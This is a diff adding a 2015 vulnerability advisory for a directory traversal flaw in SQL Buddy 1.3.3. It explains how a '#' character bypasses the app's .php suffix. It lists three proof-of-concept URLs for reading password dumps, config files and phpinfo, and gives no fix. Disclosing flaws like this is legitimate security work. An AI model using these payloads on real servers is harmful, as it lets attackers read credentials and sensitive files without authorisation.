@@ -1,0 +1,86 @@
+# Exploit Title: Path traversal vulnerability
+# Google Dork: intitle:path traversal
+# Date: 05-08-2015
+# Exploit Author:  John Page (hyp3rlinx)
+# Website: hyp3rlinx.altervista.org/
+# Vendor Homepage: http://www.sqlbuddy.com
+# Software Link: http://www.sqlbuddy.com
+# Version: 1.3.3
+# Tested on: windows 7
+# Category: webapps
+
+Source:
+====================================
+http://hyp3rlinx.altervista.org/advisories/AS-SQLBUDDY0508.txt
+
+
+Product:
+===============================
+SQL Buddy is an open source web based MySQL administration application.
+
+
+Advisory Information:
+==============================
+sqlbuddy suffers from directory traversal whereby a user can move about
+directories an read any PHP and non PHP files by appending
+the '#' hash character when requesting files via URLs.
+
+e.g. .doc, .txt, .xml, .conf, .sql etc...
+
+After adding the '#' character as a delimiter any non PHP will be returned
+and rendered by subverting the .php concatenation used
+by sqlbuddy when requesting PHP pages via POST method.
+
+Normal sqlbuddy request:
+http://localhost/sqlbuddy/home.php?ajaxRequest=666&requestKey=<xxxxxxxxxx>
+
+
+POC exploit payloads:
+=======================
+
+1-Read from Apache restricted directory under htdocs:
+  http://localhost/sqlbuddy/#page=../../../restricted/user_pwd.sql#
+
+2-Read any arbitrary files that do not have .PHP extensions:
+  http://localhost/sqlbuddy/#page=../../../directory/sensitive-file.conf#
+
+3-Read phpinfo (no need for '#' as phpinfo is a PHP file):
+  http://localhost/sectest/sqlbuddy/sqlbuddy/#page=../../../../xampp/phpinfo
+
+
+
+Severity Level:
+===============
+High
+
+
+Request Method(s):
+                                [+] POST
+
+Vulnerable Product:
+                                [+] sqlbuddy 1.3.3
+
+Vulnerable Parameter(s):
+                                [+] #page=somefile
+
+Affected Area(s):
+                                [+] Server directories & sensitive files
+
+
+Solution - Fix & Patch:
+=======================
+N/A
+
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any
+warranty. the security research reporter John Page disclaims all
+warranties, either expressed or implied, including the warranties of
+merchantability and capability for a particular purpose. apparitionsec or
+its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits or special
+damages.
+
+Domains:  hyp3rlinx.altervista.org
